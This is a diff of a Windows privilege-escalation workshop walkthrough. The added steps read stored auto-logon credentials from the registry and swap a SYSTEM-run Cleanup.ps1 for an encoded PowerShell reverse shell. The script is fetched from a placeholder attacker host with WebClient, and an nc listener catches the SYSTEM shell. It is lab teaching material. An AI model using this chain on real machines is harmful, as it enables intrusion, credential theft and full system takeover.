@@ -1,5 +1,7 @@
 Because this is a privilege escalation workshop, we are starting with a powershell reverse shell as a low privilege user. The goal for each exercise will be to get a NEW reverse shell as the NT\System user. We want to maintain our original low privilege shell so that we can have a backup shell.
 
+NOTE: Most of the time when exploiting services, we won't have rights to Start/Stop services. We would have to wait for a reboot. This workshop gives you Start/Stop rights so you don't have to reboot the machine constantly.
+
 Once we land on the machine, we want to get a quick look at the lay of the land. I have really been liking SharpUp from Ghostpack (https://github.com/GhostPack). SharpUp and Seatbelt are fantastic resources for enumerating privesc vectors. Let's start with SharpUp.
 
 I setup a listening HTTP server and then transfer over the SharpUp binary so I can run it and see the results: 
@@ -412,3 +414,71 @@ nt authority\system
 LPETestbed
 
 C:\Windows\system32>
+
+While digging through Seatbelt: we find that there are registry auto-login settings: This gives us the local user credentials.
+=== Registry Auto-logon Settings ===
+
+  DefaultUserName         : user
+  DefaultPassword         : password321
+  
+There is a scheduled task privesc in the LPE workshop, but I feel like it's not exploitable, so I am going to inject a scheduled task privesc that I have seen on Windows a number of times.
+
+Developers LOVE to comment their code and scripts. So if we find a writable directory that appears to be a Dev folder: C:\DevTools we should read through the code in there.
+
+Because this is contrived, it will be a little easier to identify. Let's talk about other things though. If we read through some code/script that looks like it should be run frequently (cleanup, provision) we can assume some privileged user is running that script. We can inject our logic into that script and try to privilege escalation. These are also a FANTASTIC place to find credentials. Lazy sysadmins LOVE to put credentials in their scripts to eliminate the chance of error. If it "just works" then it's better for everyone.
+
+PS C:\DevTools> ls
+
+
+    Directory: C:\DevTools
+
+
+Mode                LastWriteTime     Length Name                                                                      
+----                -------------     ------ ----                                                                      
+-a---        12/19/2019  10:12 AM        208 Cleanup.ps1                                                               
+
+
+PS C:\DevTools> 
+
+We can see there is a Cleanup script in the folder. Let's take a look at what it does.
+
+PS C:\DevTools> Get-Content Cleanup.ps1
+#This script is run every 5 minutes to clean up the dev tools directory.
+#This will make sure all of your .txt files get cleaned up. It's running as SYSTEM to make sure permissions are NOT an issue
+Remove-Item "C:\DevTools\*.txt"
+PS C:\DevTools> 
+
+This script is annotated for us, and tells us that it will run every 5 minutes to purge the current directory of all .txt files. So if we create our own reverse shell and place it in that powershell script, we will get a new reverse shell as the NT\Authority System user.
+
+You might think this exercise is 100% contrived, but I have seen this privesc a great number of times.
+
+So let's create the reverse shell.
+
+Take the powershell reverse shell from: https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3
+
+Edit the IP and Port.
+
+Encode using: https://raikia.com/tool-powershell-encoder/
+
+Put that into Cleanup.ps1 on your attacking machine.
+
+Then we transfer the script to our victim:
+
+(New-Object System.Net.WebClient).DownloadFile("http://YOURIPHERE/Cleanup.ps1", "C:\DevTools\Cleanup.ps1")
+
+Then we wait.
+
+Now we see we have a Powershell reverse shell as NT\Authority System
+
+root@kali:~/LPEWorkshop# nc -lvnp 31337
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::31337
+Ncat: Listening on 0.0.0.0:31337
+Ncat: Connection from 10.22.6.49.
+Ncat: Connection from 10.22.6.49:64606.
+
+PS C:\Windows\system32> whoami.exe
+nt authority\system
+PS C:\Windows\system32> hostname.exe
+LPETestbed
+PS C:\Windows\system32>
